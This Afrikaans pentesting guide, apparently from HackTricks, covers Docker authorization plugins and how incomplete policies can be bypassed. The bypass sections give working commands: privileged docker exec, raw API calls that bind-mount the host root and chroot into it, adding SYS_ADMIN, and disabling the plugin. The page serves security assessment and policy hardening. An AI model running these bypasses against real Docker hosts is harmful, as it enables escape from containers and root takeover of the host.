# Runtime Authorization Plugins

## Oorsig

Runtime authorization plugins is ’n ekstra beleidslaag wat besluit of ’n caller ’n gegewe daemon-aksie mag uitvoer. Docker is die klassieke voorbeeld. By verstek het enigiemand wat met die Docker daemon kan kommunikeer, effektief breë beheer daaroor. Authorization plugins probeer hierdie model beperk deur die authenticated user en die aangevraagde API-operasie te ondersoek en die versoek dan volgens beleid toe te laat of te weier.

Hierdie onderwerp verdien sy eie bladsy omdat dit die exploitation-model verander wanneer ’n attacker reeds toegang tot ’n Docker API of tot ’n user in die `docker`-groep het. In sulke omgewings is die vraag nie meer net "kan ek die daemon bereik?" nie, maar ook "word die daemon deur ’n authorization layer afgesper, en indien wel, kan daardie layer omseil word deur onbehandelde endpoints, swak JSON-parsing of plugin-management-permissions?"

## Werking

Wanneer ’n versoek die Docker daemon bereik, kan die authorization-subsystem die versoekkonteks aan een of meer geïnstalleerde plugins deurgee. Die plugin sien die authenticated user identity, die versoekbesonderhede, geselekteerde headers en dele van die request- of response-body wanneer die content type geskik is. Veelvuldige plugins kan geketting word, en toegang word slegs toegestaan indien alle plugins die versoek toelaat.

Hierdie model klink sterk, maar die veiligheid daarvan hang geheel en al af van hoe volledig die beleidsskrywer die API verstaan het. ’n Plugin wat `docker run --privileged` blokkeer maar `docker exec` ignoreer, alternatiewe JSON-keys soos top-level `Binds` mis, of plugin-administration toelaat, kan ’n valse gevoel van beperking skep terwyl dit steeds direkte privilege-escalation-paaie ooplaat.

## Algemene Plugin-Teikens

Belangrike areas vir beleidshersiening is:

- container creation endpoints
- `HostConfig`-velde soos `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode` en namespace-sharing-opsies
- `docker exec`-gedrag
- plugin management endpoints
- enige endpoint wat runtime actions indirek buite die bedoelde beleidsmodel kan trigger

Histories het voorbeelde soos Twistlock se `authz`-plugin en eenvoudige educational plugins soos `authobot` hierdie model maklik gemaak om te bestudeer, omdat hul policy files en code paths gewys het hoe endpoint-to-action-mapping werklik geïmplementeer is. Vir assessment-werk is die belangrike les dat die beleidsskrywer die volledige API-oppervlak moet verstaan, eerder as slegs die mees sigbare CLI commands.

## Misbruik

Die eerste doel is om uit te vind wat werklik geblokkeer word. As die daemon ’n aksie weier, leak die foutboodskap dikwels die plugin-naam, wat help om die beheer te identifiseer wat gebruik word:
```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```
As jy breër endpoint-profiling benodig, is tools soos `docker_auth_profiler` nuttig omdat hulle die andersins herhalende taak outomatiseer om na te gaan watter API-roetes en JSON-strukture werklik deur die plugin toegelaat word.

As die omgewing ’n pasgemaakte plugin gebruik en jy met die API kan interaksie hê, lys watter objekvelde werklik gefiltreer word:
```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```
Hierdie kontroles is belangrik omdat baie magtigingsfoute veldspesifiek eerder as konsep-spesifiek is. ’n Plugin mag ’n CLI-patroon verwerp sonder om die ekwivalente API-struktuur volledig te blokkeer.

### Volledige voorbeeld: `docker exec` Voeg Privilege Ná Houerskepping By

’n Beleid wat bevoorregte houerskepping blokkeer, maar onbeperkte houerskepping plus `docker exec` toelaat, kan steeds omseil word:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```
As die daemon die tweede stap aanvaar, het die gebruiker ’n bevoorregte interaktiewe proses binne ’n container herwin wat die beleidsouteur as beperk beskou het.

### Volledige voorbeeld: Bind Mount Through Raw API

Sommige gebroke policies inspekteer slegs een JSON-vorm. As die root filesystem-bind mount nie konsekwent geblokkeer word nie, kan die host steeds gemount word:
```bash
docker version
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```
Dieselfde idee kan ook onder `HostConfig` voorkom:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
http:/v1.41/containers/create
```
Die impak is ’n volledige ontsnapping uit die host se filesystem. Die interessante detail is dat die bypass deur onvolledige policy-dekking veroorsaak word, eerder as deur ’n kernel-bug.

### Volledige voorbeeld: Ongekontroleerde Capability-attribuut

As die policy vergeet om vir ’n Capability-verwante attribuut te filter, kan die aanvaller ’n container skep wat ’n gevaarlike Capability herwin:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```
Sodra `CAP_SYS_ADMIN` of ’n soortgelyke sterk capability teenwoordig is, word baie breakout-tegnieke wat in [capabilities.md](protections/capabilities.md) en [privileged-containers.md](privileged-containers.md) beskryf word, bereikbaar.

### Volledige voorbeeld: Deaktiveer die Plugin

As plugin-management-bedrywighede toegelaat word, kan die skoonste bypass wees om die beheer heeltemal af te skakel:
```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```
Dit is ’n beleidsmislukking op die control-plane-vlak. Die magtigingslaag bestaan, maar die gebruiker wat dit moes beperk, het steeds toestemming om dit te deaktiveer.

## Kontroles

Hierdie opdragte is daarop gemik om vas te stel of ’n beleidslaag bestaan en of dit volledig of oppervlakkig blyk te wees.
```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```
Wat is hier interessant:

- Denial-boodskappe wat 'n plugin-naam insluit, bevestig 'n magtigingslaag en onthul dikwels die presiese implementering.
- 'n Plugin-lys wat vir die attacker sigbaar is, kan genoeg wees om te ontdek of disable- of reconfigure-bewerkings moontlik is.
- 'n Policy wat slegs ooglopende CLI-aksies blokkeer, maar nie rou API-versoeke nie, moet as bypassable beskou word totdat die teendeel bewys is.

## Runtime-standaardinstellings

| Runtime / platform | Standaardtoestand | Standaardgedrag | Algemene handmatige verswakking |
| --- | --- | --- | --- |
| Docker Engine | Nie by verstek enabled nie | Toegang tot die daemon is effektief alles-of-niks, tensy 'n authorization plugin gekonfigureer is | onvolledige plugin-policy, blacklists in plaas van allowlists, die toelating van plugin-management, blindekolle op veldvlak |
| Podman | Nie 'n algemene direkte ekwivalent nie | Podman steun gewoonlik meer op Unix-permissions, rootless execution en besluite oor API-exposure as op Docker-styl authz-plugins | om 'n rootful Podman-API breed bloot te stel, swak socket-permissions |
| containerd / CRI-O | Verskillende control model | Hierdie runtimes steun gewoonlik op socket-permissions, node trust boundaries en hoërvlak-orchestrator-kontroles eerder as Docker-authz-plugins | om die socket in workloads te mount, swak node-local trust assumptions |
| Kubernetes | Gebruik authn/authz by die API-server- en kubelet-lae, nie Docker-authz-plugins nie | Cluster RBAC en admission controls is die hoof-policylaag | te breë RBAC, swak admission-policy, om kubelet- of runtime-API's direk bloot te stel |

{{#include ../../../banners/hacktricks-training.md}}
